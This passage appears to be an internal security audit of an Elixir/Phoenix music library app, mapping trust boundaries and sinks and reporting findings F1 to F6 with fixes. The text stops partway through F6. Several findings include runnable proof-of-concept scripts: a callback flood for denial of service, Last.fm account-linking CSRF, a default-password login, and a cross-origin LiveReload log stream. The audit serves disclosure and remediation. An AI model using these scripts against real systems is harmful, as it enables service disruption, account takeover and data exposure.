---
id: doc-35
title: Application Security Audit 2026-07-10
type: other
created_date: "2026-07-10 06:19"
updated_date: "2026-07-10 06:23"
tags:
  - security
  - audit
  - elixir
---

## Trust boundaries

| Actor                                                           | Trusted     | Controls                                                                                                                                                 | Source                                                                                                                                        |
| --------------------------------------------------------------- | ----------- | -------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------- |
| Anonymous Internet client                                       | no          | Requests, headers, and route/query values for `/health`, `/login`, `/sessions/create`, `/auth/last_fm/callback`, and `/public/assets/:transform_payload` | `lib/music_library_web/router.ex:49-65`; production binds publicly in `config/runtime.exs:167-178`                                            |
| Authenticated browser operator                                  | conditional | All LiveView route params, events, forms, uploads, searches, record metadata, notes, chat prompts, and maintenance actions                               | `lib/music_library_web/router.ex:66-124`; the app is documented as a single-user operator console in `docs/architecture.md`                   |
| Bearer-token API client                                         | conditional | `/api/v1/*` params and bodies after possession of `API_TOKEN`                                                                                            | `lib/music_library_web/router.ex:126-141`; `lib/music_library_web/auth.ex:15-25`; `docs/production-infrastructure.md` “Environment Variables” |
| Last.fm authorization participant                               | no          | A callback `token` tied to a Last.fm user and API account                                                                                                | `lib/music_library_web/controllers/last_fm_controller.ex:1-48`; Last.fm Web Authentication documentation                                      |
| External providers                                              | no          | MusicBrainz, Last.fm, Discogs, Wikipedia, Brave, and OpenAI response bodies, metadata, HTML, image URLs, redirects, and image bytes                      | `docs/architecture.md` “External API Integrations”; the corresponding modules under `lib/*/api.ex`                                            |
| Deployment operator/configuration                               | yes         | Environment secrets, database paths, host/port, API credentials, mail settings, and optional Req test/config options                                     | `config/runtime.exs:19-178`; `docs/production-infrastructure.md` “Environment Variables”                                                      |
| Local developer and Mix-task caller                             | yes         | Dev server startup, local paths, task arguments, source checkout, shell environment, QueryReporter path, and debugger access                             | `README.md` “Setup” and “Running the application”; `lib/music_library/query_reporter.ex:1-49`                                                 |
| Local-network or hostile web origin while dev server is running | no          | Connections to ports bound by development services and WebSocket `Origin`                                                                                | `config/dev.exs:27-35,64-76`; `lib/music_library_web/endpoint.ex:37-46`                                                                       |
| SQLite persisted state                                          | conditional | Previously stored operator/provider values re-entering SQL, HTML, URL, image, email, PDF, and prompt contexts                                            | `docs/architecture.md` “Database & Repos” and “Schemas”                                                                                       |
| Email client/image proxy                                        | no          | Rendering generated HTML and requests to public asset URLs exposed in email                                                                              | `lib/music_library_web/records_on_this_day_email.ex:43-205`                                                                                   |

## Inventory

| ID  | Location                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    | Class                                                     | Consumes                                                                                                                   |
| --- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------- |
| S1  | `lib/music_library_web/controllers/last_fm_controller.ex:33-35`; `lib/music_library_web/router.ex:59`                                                                                                                                                                                                                                                                                                                                                                                       | Validation / shared mutable state                         | Anonymous Last.fm callback token; successful exchange replaces the global encrypted `last_fm_session_key`                  |
| S2  | `lib/last_fm/api.ex:11-27,159-181`; `lib/req/rate_limiter.ex:62-110`                                                                                                                                                                                                                                                                                                                                                                                                                        | Network / resource consumption / ETS                      | Every callback reserves a globally serialized future Last.fm request slot and sleeps until it                              |
| S3  | `lib/music_library_web/auth.ex:10-13`; `lib/music_library_web/controllers/session_controller.ex:18-27`                                                                                                                                                                                                                                                                                                                                                                                      | Authentication validation / cryptography                  | Submitted login password and issuance of the week-long logged-in session                                                   |
| S4  | `lib/music_library_web/endpoint.ex:7-23,63`; `config/runtime.exs:167-178`; `config/prod.exs:1-8`                                                                                                                                                                                                                                                                                                                                                                                            | Cryptography / transport validation                       | Signed/encrypted session cookie attributes and request scheme behind the TLS-terminating proxy                             |
| S5  | `config/config.exs:39-41`; `config/dev.exs:27-35`; `lib/music_library_web/router.ex:66-124,143-212`                                                                                                                                                                                                                                                                                                                                                                                         | Network / authentication validation                       | Dev listener on all IPv4 interfaces, fixed dev password/token, debug errors, and privileged dashboards                     |
| S6  | `config/dev.exs:31-34,64-76`; `lib/music_library_web/endpoint.ex:42-45`                                                                                                                                                                                                                                                                                                                                                                                                                     | Reflection gadget / Logger shared state / WebSocket       | Unauthenticated LiveReload socket joins, arbitrary Origin, absolute path replies, and streamed server logs                 |
| S7  | `lib/music_library/assets/transform.ex:33-96`; `lib/music_library_web/controllers/asset_controller.ex:12-21`                                                                                                                                                                                                                                                                                                                                                                                | Round-trip integrity / deserialization / validation       | Base64url JSON transform payload, `hash` shape, `width`, and canonical string conversion                                   |
| S8  | `lib/music_library_web/controllers/asset_controller.ex:36-58`; `lib/music_library/assets/image.ex:16-51`; `lib/music_library/assets/cache.ex:43-90`                                                                                                                                                                                                                                                                                                                                         | Native/FFI / resource consumption / ETS                   | Stored image bytes, requested width/format, libvips processing, and cached output                                          |
| S9  | `lib/brave_search/api.ex:42-50`; `lib/music_library_web/components/record_form.ex:521-530`; `lib/music_library_web/live/artist_live/form.ex:236-245`                                                                                                                                                                                                                                                                                                                                        | Network / SSRF / resource consumption                     | Browser-selected and Brave-returned image URL; redirects and full response body                                            |
| S10 | `lib/discogs/api.ex:33-43`; `lib/music_library/artists.ex:239-252`                                                                                                                                                                                                                                                                                                                                                                                                                          | Network / SSRF / resource consumption                     | Discogs-returned artist image URL and bytes                                                                                |
| S11 | `lib/music_brainz/api.ex:483-502`; `lib/music_library/records/enrichment.ex:53-62`                                                                                                                                                                                                                                                                                                                                                                                                          | Network / SSRF / resource consumption                     | Generated or persisted cover URL and bytes                                                                                 |
| S12 | `lib/brave_search/api.ex:55-70`; `lib/discogs/api.ex:46-83,114-160`; `lib/last_fm/api.ex:158-201`; `lib/music_brainz/api.ex:505-565`; `lib/open_ai/api.ex:31-205`; `lib/wikipedia/api.ex:19-148`                                                                                                                                                                                                                                                                                            | Network                                                   | Fixed-host API requests, TLS, redirects, authentication headers/query params, and provider responses                       |
| S13 | `lib/last_fm/session.ex:44-93`                                                                                                                                                                                                                                                                                                                                                                                                                                                              | Deserialization / resource consumption                    | Last.fm XML processed by `:xmerl_scan` and XPath                                                                           |
| S14 | `lib/open_ai/api.ex:94-180`; `lib/music_library/records/enrichment.ex:19-45`; `lib/music_library/assets/transform.ex:57-68`; `lib/music_library/listening_stats.ex:708-715`                                                                                                                                                                                                                                                                                                                 | Deserialization / resource consumption                    | External SSE/JSON, AI JSON, route JSON, and database-produced JSON                                                         |
| S15 | `lib/music_library_web/markdown.ex:10-151`                                                                                                                                                                                                                                                                                                                                                                                                                                                  | Template / validation / regex                             | Notes, descriptions, and AI text transformed to Markdown/HTML, including custom links                                      |
| S16 | `lib/music_library_web/components/chat.ex:244,259`; `lib/music_library_web/components/core_components.ex:145-155`; `lib/music_library_web/components/notes.ex:160-166`; `lib/music_library_web/components/search_components.ex:396-401`; `lib/music_library_web/live/artist_live/biography.ex:65-70`; `lib/music_library_web/live/artist_live/show.ex:754-759`; `lib/music_library_web/live/record_set_live/index.ex:454-458`; `lib/music_library_web/live/record_set_live/show.ex:286-290` | HTML template / raw output                                | Sanitized Markdown, highlighted debug JSON, and upstream Wikipedia HTML                                                    |
| S17 | `lib/error_tracker/error_notifier/email.ex:7-133`; `lib/music_library_web/records_on_this_day_email.ex:43-205`                                                                                                                                                                                                                                                                                                                                                                              | HTML/email interpolation                                  | Error reasons, stack data, record titles/artists, URLs, and configured mail addresses                                      |
| S18 | `lib/music_brainz/external_link.ex:11-32`; `lib/music_library_web/components/core_components.ex:184-220`; `lib/music_library_web/live/artist_live/show.ex:240-307`                                                                                                                                                                                                                                                                                                                          | URL/template navigation                                   | Provider-controlled external links, Wikipedia URL, and favicon URL                                                         |
| S19 | `lib/music_library/online_store_templates/online_store_template.ex:20-39`; `lib/music_library/online_store_templates.ex:82-91`; `lib/music_library_web/live/wishlist_live/show.ex:99-113`                                                                                                                                                                                                                                                                                                   | Validation / URL interpolation                            | Operator URL template and provider/operator record values used in a browser link                                           |
| S20 | `lib/music_library/records/tracklist_pdf.ex:25-113`                                                                                                                                                                                                                                                                                                                                                                                                                                         | Code/template execution                                   | Record/release metadata interpolated into Typst source and passed to the Typst engine                                      |
| S21 | `lib/music_library/records/search.ex:42-157`                                                                                                                                                                                                                                                                                                                                                                                                                                                | SQL/FTS interpolation / validation                        | Browser/API structured search and free-text terms entering SQLite FTS5 `MATCH`                                             |
| S22 | `lib/music_library/artists.ex:36-107`; `lib/music_library/collection.ex:69-188`; `lib/music_library/collection/enrichment.ex:87-115`; `lib/music_library/errors.ex:169-176`; `lib/music_library/listening_stats.ex:99-690`; `lib/music_library/maintenance.ex:55-126`; `lib/music_library/records/import.ex:28-32`; `lib/music_library/records/query.ex:21-35`; `lib/music_library/scrobble_rules.ex:90-392`; `lib/mix/tasks/scrobble/audit.ex:176-231`                                     | SQL fragments                                             | Stored/provider/browser values consumed by static Ecto fragments and JSON/LIKE expressions                                 |
| S23 | `lib/music_library/record_sets.ex:146-164,222-244`; `lib/music_library/scrobble_rules.ex:498-536`                                                                                                                                                                                                                                                                                                                                                                                           | Raw SQL construction                                      | Ordered record IDs and scrobble-rule values; SQL structure partly assembled as strings                                     |
| S24 | `lib/music_library_web/telemetry/storage.ex:188-230`; `lib/music_library/telemetry_metrics.ex:241-264`; `lib/music_library_web/controllers/health_controller.ex:5-14`; `lib/music_library/repo.ex:83-86`                                                                                                                                                                                                                                                                                    | Raw SQL                                                   | Metric key/time/retention parameters and constant health/VACUUM/PRAGMA statements                                          |
| S25 | `lib/sqlite_vec/ecto/query.ex:7-182`; `lib/music_library/records/similarity.ex:258-324`; `config/runtime.exs:39-46`                                                                                                                                                                                                                                                                                                                                                                         | Native extension / SQL / memory safety                    | Embedding vectors, distances, limits, and calls into the sqlite-vec extension                                              |
| S26 | `priv/repo/migrations/20241122094655_create_records_search_index.exs:6-149`; `priv/repo/migrations/20250501081635_rename_records_release_to_release_date.exs:9-240`; `priv/repo/migrations/20250525081349_create_unaccented_search_index.exs:5-246`; `priv/repo/migrations/20260402104145_add_selected_release_id_to_records_search_index.exs:5-287`; other `priv/*/migrations/*.exs`                                                                                                       | SQL/DDL execution                                         | Static migration DDL, triggers, views, and existing database rows                                                          |
| S27 | `lib/music_library_web/components/record_form.ex:432-441`; `lib/music_library_web/live/artist_live/form.ex:201-212`                                                                                                                                                                                                                                                                                                                                                                         | File operations / native image parsing                    | Phoenix-managed upload temp path, attacker-supplied bytes, and client MIME type                                            |
| S28 | `lib/music_library/query_reporter.ex:23-66,106-149`                                                                                                                                                                                                                                                                                                                                                                                                                                         | File operations / round-trip integrity / telemetry gadget | Developer-supplied output path and SQL query/parameter serialization into executable-looking SQL                           |
| S29 | `lib/mix/tasks/esbuild/release.ex:5-26`; `lib/mix/tasks/tailwind/release.ex:5-26`; `lib/mix/tasks/sqlean/release.ex:4-54`                                                                                                                                                                                                                                                                                                                                                                   | Network / file operations                                 | Developer-invoked release metadata requests and predetermined/configured files                                             |
| S30 | `lib/prettier.ex:8-40`                                                                                                                                                                                                                                                                                                                                                                                                                                                                      | Command execution / file operations                       | HEEx script-tag content, formatter-derived suffix, temp file, PATH-resolved `prettier` executable                          |
| S31 | `config/runtime.exs:39-46`; `lib/music_library/repo.ex:24-53`                                                                                                                                                                                                                                                                                                                                                                                                                               | Native code loading / path handling                       | OS/architecture and literal names selecting bundled SQLite shared libraries                                                |
| S32 | `config/runtime.exs:52-65`; `lib/music_library/assets/asset.ex:58-66`; `lib/last_fm/api/signature.ex:1-13`; `lib/discogs/api.ex:84-112`; `lib/music_library_web/auth.ex:10-20`; `lib/music_library_web/router.ex:181-183`                                                                                                                                                                                                                                                                   | Cryptography                                              | Cloak AES-GCM key, SHA-256 hashes, protocol-required MD5 signature, cert fingerprint, constant-time comparisons, CSP nonce |
| S33 | `lib/music_library_web.ex:126-127`                                                                                                                                                                                                                                                                                                                                                                                                                                                          | Dynamic dispatch / metaprogramming                        | Compile-time `use MusicLibraryWeb, which` atom passed to `apply/3`                                                         |
| S34 | `lib/music_library_web/live/stats_live/top_by_period.ex:114-120`                                                                                                                                                                                                                                                                                                                                                                                                                            | Resource consumption / atom conversion                    | Forged authenticated LiveView period string passed to `String.to_existing_atom/1`                                          |
| S35 | `lib/music_library/assets/cache.ex:43-90`; `lib/music_library/application.ex:10-13`                                                                                                                                                                                                                                                                                                                                                                                                         | Shared mutable state / resource consumption               | Canonical asset transform keys and encoded image binaries in a public ETS table                                            |
| S36 | `lib/error_tracker/error_notifier.ex:11-169`; `lib/music_library_web/telemetry/storage.ex:39-118`; `lib/music_library/query_reporter.ex:31-49`; `lib/music_library/application.ex:31-34`                                                                                                                                                                                                                                                                                                    | Telemetry/Logger gadget / shared mutable state            | Attached handlers, error IDs, telemetry datapoints, developer file path, and production Logger attachment                  |
| S37 | `lib/music_library/records/search.ex:49-58`; `lib/music_library/retry_delay.ex:73-116`; `lib/music_library/telemetry_metrics.ex:166-184`; `lib/music_library_web/live/artist_live/biography.ex:26-63`; `lib/music_library_web/markdown.ex:108-144`                                                                                                                                                                                                                                          | Regex / validation / resource consumption                 | Search text, provider retry headers, API duration values, biography HTML, and Markdown links                               |
| S38 | `lib/music_library/record_sets.ex:108-136,166-209`; `lib/music_library/assets.ex:54-77`; `lib/music_library_web/controllers/last_fm_controller.ex:33-35`                                                                                                                                                                                                                                                                                                                                    | Concurrency / check-then-act                              | Max-position then insert, item swaps, reference check/prune, and last-writer-wins global OAuth secret                      |
| S39 | `lib/music_brainz.ex:34-61`; `lib/music_library/worker/backfill_scrobbled_tracks.ex`; `lib/open_ai/api.ex:94-116`                                                                                                                                                                                                                                                                                                                                                                           | Unbounded loop/stream                                     | Provider paging until a short page, self-chaining history import, and streamed provider body                               |
| S40 | `lib/music_library_web/controllers/collection_controller.ex:29-53,114-123`; `lib/music_library_web/controllers/error_controller.ex:5-20,82-91`                                                                                                                                                                                                                                                                                                                                              | Validation / resource consumption                         | Bearer-authenticated date, `limit`, and `offset`, including values without upper bounds                                    |
| S41 | `scripts/prod/backup:21-32`; `scripts/prod/litestream-backup:21-42`; `scripts/prod/prune-backups:12`                                                                                                                                                                                                                                                                                                                                                                                        | Shell command / file operations                           | Trusted aliases, constant paths, timestamp, credential-bearing environment, and local backup files                         |
| S42 | `config/runtime.exs:83-178`; `config/dev.exs:3-18`; `config/config.exs:84-100`                                                                                                                                                                                                                                                                                                                                                                                                              | Path handling / environment                               | Operator database paths, host/port/pool values, and build working directories                                              |
| S43 | `assets/js/app.js:93-105`                                                                                                                                                                                                                                                                                                                                                                                                                                                                   | Client-side deserialization / file handling               | Server-pushed base64, MIME type, and filename turned into a browser Blob download                                          |
| S44 | `mix.exs:128-131`; `lib/music_library_web/components/layouts/root.html.heex:35`; dependency `LiveDebugger.App.Debugger.Actions.UserEvents`                                                                                                                                                                                                                                                                                                                                                  | Reflection gadget / code execution                        | Dev-only debugger payload eventually passed to `Code.eval_quoted/1`                                                        |
| S45 | `lib/music_library_web/router.ex:9-26,29-39,188-209`                                                                                                                                                                                                                                                                                                                                                                                                                                        | Template validation / CSP                                 | CSP directives, nonce insertion, and deliberate `unsafe-inline`/`wasm-unsafe-eval` allowances                              |
| S46 | `lib/brave_search/api.ex:86-108`; `lib/discogs/api.ex:131-154`; `lib/last_fm/api.ex:206-230`; `lib/music_brainz/api.ex:536-563`; `lib/open_ai/api.ex:188-201`; `lib/wikipedia/api.ex:115-145`; `lib/music_library/logger/single_line_formatter.ex:30-55`                                                                                                                                                                                                                                    | Log interpolation / validation                            | Provider URLs/bodies/messages and application errors entering logs; production newline flattening                          |

## Findings

### F1 — Anonymous callback requests create an unbounded serialized Last.fm queue

**Severity:** High
**CWE:** CWE-400
**Location:** `lib/music_library_web/controllers/last_fm_controller.ex:33-35` | `lib/last_fm/api.ex:11-27,159-181` | `lib/req/rate_limiter.ex:62-110`
**Sinks:** S1, S2

**Trace:** `GET /auth/last_fm/callback?token=X` (anonymous route) → `LastFmController.callback/2` → `LastFm.get_session/1` → `LastFm.API.get_session/2` → Req request step `Req.RateLimiter.throttle/1` → `reserve_slot/3` atomically advances the single `:last_fm` `next_free_at` by 500 ms for every caller → each request process sleeps until its claimed slot → outbound Last.fm request. The token is not validated locally before reservation, so arbitrary 32-character strings reach the sink.

**Boundary:** This crosses the anonymous Internet boundary identified above. The controller documentation calls the Req limiter a protection that bounds quota use, but it does not bound inbound callers, queue length, sleep duration, request-process count, or how far into the future `next_free_at` may be moved.

**Validation:** The following local-only script was not executed. It demonstrates linear queue growth without requiring a valid Last.fm token.

```elixir
# scripts/music_library/lastfm_callback_queue_dos.exs
# Run only against a disposable local dev instance.
Mix.install([{:req, "~> 0.6"}])

base = System.get_env("TARGET", "http://127.0.0.1:4003")
requests = String.to_integer(System.get_env("REQUESTS", "20"))
started = System.monotonic_time(:millisecond)

results =
  1..requests
  |> Task.async_stream(
    fn i ->
      token = :crypto.hash(:md5, Integer.to_string(i)) |> Base.encode16(case: :lower)

      Req.get(base <> "/auth/last_fm/callback",
        params: [token: token],
        redirect: false,
        receive_timeout: 120_000
      )
    end,
    max_concurrency: requests,
    ordered: false,
    timeout: 180_000
  )
  |> Enum.to_list()

elapsed = System.monotonic_time(:millisecond) - started
IO.inspect(results, label: "responses")
IO.puts("#{requests} anonymous callbacks took #{elapsed}ms")
IO.puts("Expected lower bound from the serialized limiter: about #{(requests - 1) * 500}ms")
```

**Prior art:** `git log -S reserve_slot` identifies commit `f4d51503` (`ML-216: make rate limiter reservation atomic`), which changed the table from a last-request timestamp to an atomic future-slot queue. The ML-216 task explicitly requires every concurrent caller to reserve a distinct cooldown-spaced slot and records “No known follow-up.” Earlier commit `90db1138` / ML-5 accepted anonymous callback quota burn because the limiter supposedly bounded it. The May security review (`doc-19`, S29) ruled the limiter out because service _keys_ are internal; that review predates `f4d51503` and did not assess attacker-controlled queue depth.

**Reach:** Any remote client can call the production route with arbitrary tokens. A burst reserves slots before Last.fm rejects any token. Large bursts retain many sleeping Phoenix request processes and delay legitimate Last.fm jobs/callbacks; canceled clients can still leave the ETS timestamp advanced.

**Rating:** High confidence, High severity. The endpoint is unauthenticated, Last.fm configuration is a normal deployment condition, and the attack needs no valid token or asset. Impact is sustained application/Last.fm availability rather than code execution.

**Suggested fix:** Require a one-time, expiring callback state created by an authenticated initiation, and bound or reject limiter reservations beyond a small queue/wait threshold. Inbound rate limiting at the proxy/Plug layer should be an additional defense, not the only fix.

### F2 — Last.fm callback can replace the global linked account without an initiated flow

**Severity:** Medium
**CWE:** CWE-352
**Location:** `lib/music_library_web/controllers/last_fm_controller.ex:33-35` | `lib/last_fm.ex:87-90` | `lib/music_library/secrets.ex:9-14`
**Sinks:** S1, S12, S38

**Trace:** An attacker obtains a Last.fm authorization token for the application's API key and the attacker's Last.fm account → directly requests the anonymous callback with that token → the server signs `auth.getSession` using its shared secret → Last.fm returns the attacker's long-lived session key → `Secrets.store/2` uses `on_conflict: :replace_all` and overwrites the singleton `last_fm_session_key`. No app session, pending authorization record, state nonce, expected Last.fm identity, or confirmation is checked.

**Boundary:** This crosses the Last.fm authorization-participant boundary into global credential state. A valid token proves that _some_ Last.fm user authorized this API account; it does not prove that the application owner initiated this callback or that the returned user is the intended account. The single-user design increases impact because the write is global rather than tenant-scoped.

**Validation:** The following script was not executed. `LASTFM_API_KEY` is a client identifier; authorize the printed URL while signed into a test attacker Last.fm account. The callback is sent without an application cookie and changes the account shown by the app's Last.fm connection check.

```elixir
# scripts/music_library/lastfm_account_linking_csrf.exs
Mix.install([{:req, "~> 0.6"}])

base = System.fetch_env!("TARGET") |> String.trim_trailing("/")
api_key = System.fetch_env!("LASTFM_API_KEY")
callback = base <> "/auth/last_fm/callback"

authorize_url =
  "https://www.last.fm/api/auth/?" <>
    URI.encode_query(%{"api_key" => api_key, "cb" => callback})

IO.puts("Open while logged into the test attacker Last.fm account:")
IO.puts(authorize_url)
IO.puts("Last.fm will call #{callback}?token=... without an app session.")

if token = System.get_env("ATTACKER_LASTFM_TOKEN") do
  response =
    Req.get!(callback,
      params: [token: token],
      redirect: false
    )

  IO.inspect({response.status, Req.Response.get_header(response, "location")},
    label: "anonymous callback response"
  )
end
```

**Prior art:** ML-5 / commit `90db1138` deliberately accepted the route and states: “cannot forge a valid token (Last.fm validates) ... Acceptable given the threat model.” That conclusion does not cover a valid token authorized by the wrong Last.fm user. Last.fm's Web Authentication documentation says tokens are “user and API account specific,” permits a custom `cb`, and says resulting session keys have infinite lifetime by default. RFC 6749 §10.12 describes binding authorization callbacks to the user-agent's authenticated state; the same CSRF principle applies even though Last.fm's legacy flow does not natively return an OAuth `state` parameter.

**Reach:** The attacker needs the application's API key and a Last.fm account. The key is a client identifier shown in the legitimate browser authorization URL, not the shared secret. This is plausible for someone with prior access, browser/history/log visibility, or disclosure of that URL, but it is not a no-precondition Internet attack.

**Rating:** High confidence, Medium severity. The integrity impact is replacement of the credential used for scrobbling and profile/history operations; exploitation needs knowledge of the API key and Last.fm authorization interaction.

**Suggested fix:** Generate an expiring one-time state on an authenticated “connect Last.fm” action and include it in Last.fm's custom `cb` query string; consume it exactly once before exchanging/storing the token. Verify or confirm the returned Last.fm username before replacing an existing key.

### F3 — Development server exposes a known administrator password on all interfaces

**Severity:** Medium
**CWE:** CWE-798
**Location:** `config/config.exs:39-41` | `config/dev.exs:27-35` | `lib/music_library_web/controllers/session_controller.ex:18-27`
**Sinks:** S3, S5

**Trace:** `MIX_ENV=dev` loads the base `login_password: "change me"` and does not override it in `config/dev.exs` → the endpoint binds `0.0.0.0:4003` with debug errors and origin checks disabled → a network client submits the repository-known password → `Auth.correct_login_password?/1` succeeds → the client receives the same privileged session used for every LiveView and `/dev` dashboard.

**Boundary:** This crosses the untrusted local-network/dev-origin boundary. A development operator is trusted; another device or process that can reach the deliberately public dev listener is not. Production's runtime password override does not mitigate the dev configuration.

**Validation:** This script was not executed.

```elixir
# scripts/music_library/dev_default_password.exs
Mix.install([{:req, "~> 0.6"}, {:floki, "~> 0.38"}])

base = System.get_env("TARGET", "http://127.0.0.1:4003")
login = Req.get!(base <> "/login", redirect: false)

csrf =
  login.body
  |> Floki.parse_document!()
  |> Floki.find("input[name='_csrf_token']")
  |> Floki.attribute("value")
  |> List.first()

cookie =
  login
  |> Req.Response.get_header("set-cookie")
  |> List.first()
  |> String.split(";", parts: 2)
  |> hd()

response =
  Req.post!(base <> "/sessions/create",
    form: %{"_csrf_token" => csrf, "password" => "change me"},
    headers: %{"cookie" => cookie},
    redirect: false
  )

IO.inspect(
  {response.status, Req.Response.get_header(response, "location")},
  label: "known-password login"
)
```

**Prior art:** `git log -S 'ip: {0, 0, 0, 0}'` identifies commit `a3310eeb` (“Allow access from external devices”), which intentionally changed loopback to all interfaces. `git log -S 'login_password: "change me"'` traces the fixed base credential to the early authentication implementation; no dev override or opt-in gate was added. Existing security reviews treated the authenticated browser as a boundary but did not combine these defaults.

**Reach:** Requires a running dev server and a route to the developer machine (LAN, shared workstation/container/VM, or forwarded development port). Successful access permits collection mutation, external API actions, maintenance operations, LiveDashboard/Oban/ErrorTracker, and the dev mailbox. The documented production-backup workflow also copies production data into the dev database, increasing potential confidentiality impact.

**Rating:** High confidence, Medium severity because network/dev-server positioning is required. The credential and listener configuration are deterministic on a fresh checkout.

**Suggested fix:** Bind dev to loopback by default and make external-device binding an explicit environment-controlled mode. Require a per-developer secret with no checked-in fallback before external binding, and refuse startup when the placeholder remains.

### F4 — Dev LiveReload WebSocket accepts arbitrary origins and streams server logs without authentication

**Severity:** Medium
**CWE:** CWE-346
**Location:** `config/dev.exs:31-34,64-76` | `lib/music_library_web/endpoint.ex:42-45`
**Sinks:** S6, S36

**Trace:** The dev endpoint binds all interfaces and sets endpoint `check_origin: false` → `/phoenix/live_reload/socket` uses `Phoenix.LiveReloader.Socket.connect/2`, which accepts any params → joining `phoenix:live_reload` requires no app session or CSRF token → because `web_console_logger: true`, `Phoenix.LiveReloader.Channel.join/3` subscribes the socket to the global web-console Logger stream → each log event, file, and line is pushed to the client. Its `full_path` event also returns project/dependency absolute paths.

**Boundary:** This crosses the local-network/hostile-origin boundary into the application's Logger stream. The normal browser login pipeline never runs for this endpoint. Tidewave's own localhost/Origin checks do not wrap the independent Phoenix LiveReload socket.

**Validation:** This script was not executed. Generate any app log after it joins; the client should print `log` frames despite the attacker Origin and absence of cookies.

```elixir
# scripts/music_library/dev_live_reload_log_stream.exs
Mix.install([{:websockex, "~> 0.4"}, {:jason, "~> 1.4"}])

defmodule LiveReloadProbe do
  use WebSockex

  @impl true
  def handle_connect(_conn, state) do
    join = Jason.encode!(["1", "1", "phoenix:live_reload", "phx_join", %{}])
    WebSockex.send_frame(self(), {:text, join})
    {:ok, state}
  end

  @impl true
  def handle_frame({:text, message}, state) do
    IO.puts(message)
    {:ok, state}
  end
end

url =
  System.get_env(
    "LIVE_RELOAD_URL",
    "ws://127.0.0.1:4003/phoenix/live_reload/socket/websocket?vsn=2.0.0"
  )

{:ok, _pid} =
  WebSockex.start_link(url, LiveReloadProbe, %{},
    extra_headers: [{"origin", "http://attacker.example"}]
  )

IO.puts("Joined without an app session; trigger a server log now.")
Process.sleep(30_000)
```

**Prior art:** Commit `3ea2e138` enabled `web_console_logger: true`; `a3310eeb` exposed the endpoint to external devices. `git log --all --grep='origin|live reload'` found CSP/origin compatibility changes but no authentication or exposure review. Tidewave documentation explicitly blocks remote clients by default, showing that localhost is a security boundary, but that control is not shared by LiveReload.

**Reach:** A LAN client can connect directly. A hostile HTTP origin in a developer's browser can also attempt a cross-origin WebSocket because Origin checking is disabled. Logs can contain request behavior, exception details, provider URLs/bodies, database diagnostics, and source paths.

**Rating:** High confidence, Medium severity. Exploitation requires the dev server to be running and reachable; the confidentiality impact is potentially sensitive development/application telemetry, not production code execution.

**Suggested fix:** Keep `check_origin` enabled with an explicit development host/origin list, bind loopback by default, and disable `web_console_logger` whenever external binding is enabled. If external-device testing is needed, place it behind authenticated TLS rather than disabling origin checks globally.

### F5 — Session cookie security depends on an unrewritten proxy scheme and HSTS is not enabled in the app

**Severity:** Medium
**CWE:** CWE-614
**Location:** `lib/music_library_web/endpoint.ex:7-17,63` | `config/prod.exs:1-8` | `config/runtime.exs:167-178,203-209`
**Sinks:** S4

**Trace:** Successful password login writes the encrypted cookie using `@session_options`, which omits `secure` → Plug defaults `Secure` from `conn.scheme` → production terminates TLS at Coolify and connects to the Bandit container over configured `http` → the app has no `force_ssl`/`Plug.SSL` `rewrite_on: [:x_forwarded_proto]`, so source code does not establish an HTTPS scheme before `Plug.Session` → the cookie may be emitted without `Secure`. HTTP-to-HTTPS redirection occurs at Coolify, but a non-Secure cookie is sent on the initial HTTP request before the redirect. No app HSTS setting prevents that first downgrade.

**Boundary:** This crosses the browser/network boundary. The deployment operator's proxy configuration is trusted, but a redirect is not equivalent to a Secure cookie or HSTS. `docs/production-infrastructure.md` documents TLS termination at Coolify and claims HTTP redirect; it does not document cookie rewriting or HSTS at the proxy.

**Validation:** This script was not executed. Run against a disposable deployment with its configured password and inspect whether the authenticated `Set-Cookie` contains `Secure`; sending `x-forwarded-proto: https` to a local HTTP deployment also demonstrates that the app has no rewrite configuration.

```elixir
# scripts/music_library/session_cookie_flags.exs
Mix.install([{:req, "~> 0.6"}, {:floki, "~> 0.38"}])

base = System.fetch_env!("TARGET") |> String.trim_trailing("/")
password = System.fetch_env!("LOGIN_PASSWORD")
headers = %{"x-forwarded-proto" => "https"}
login = Req.get!(base <> "/login", headers: headers, redirect: false)

csrf =
  login.body
  |> Floki.parse_document!()
  |> Floki.find("input[name='_csrf_token']")
  |> Floki.attribute("value")
  |> List.first()

cookie =
  login
  |> Req.Response.get_header("set-cookie")
  |> List.first()
  |> String.split(";", parts: 2)
  |> hd()

response =
  Req.post!(base <> "/sessions/create",
    headers: Map.put(headers, "cookie", cookie),
    form: %{"_csrf_token" => csrf, "password" => password},
    redirect: false
  )

set_cookie = Req.Response.get_header(response, "set-cookie")
IO.inspect(set_cookie, label: "authenticated Set-Cookie")
IO.puts("secure? #{Enum.any?(set_cookie, &String.contains?(String.downcase(&1), "; secure"))}")
```

**Prior art:** Commit `1902c5f4` added signing and encryption but not `Secure`. The generated `config/runtime.exs` has always left `force_ssl: [hsts: true]` commented out. Commit `33a3ed54` added only a redirect assertion; `eec746e4` explicitly attributes that redirect to Coolify. No history or Backlog item for Secure/HSTS was found.

**Reach:** An on-path attacker must induce or observe an HTTP request from a browser that already holds the one-week session cookie. This is realistic on an untrusted network but not a direct remote attack. A stolen cookie is replayable and grants the sole administrator session.

**Rating:** Medium confidence, Medium severity. The source/deployment topology implies the issue, but an undocumented proxy rule could add `Secure` or HSTS outside the repository.

**Suggested fix:** Set `secure: true` explicitly for the production session cookie and configure `force_ssl: [hsts: true, rewrite_on: [:x_forwarded_proto]]` in production compile-time config. Add production assertions for `Secure`, `HttpOnly`, `SameSite`, and `Strict-Transport-Security`.

### F6 — Internet-facing password authentication has no attempt throttling

**Severity:** Medium
**CWE:** CWE-307
**Location:** `lib/music_library_web/controllers/session_controller.ex:18-27` | `lib/music_library_web/auth.ex:10-13` | `lib/music_library_web/router.ex:51-53`
**Sinks:** S3

**Trace:** Anonymous client obtains a reusable CSRF/session pair from `/login` → submits any password to `/sessions/create` → a constant-time comparison runs → every failure immediately redirects with the same behavior. There is no per-IP/global attempt counter, delay, lockout, CAPTCHA, queue, or documented Coolify ingress limit.

**Boundary:** This crosses the anonymous Internet boundary into the sole administrator authentication predicate. CSRF prevents cross-site form submission; it does not limit an attacker who fetches their own token and cookie.

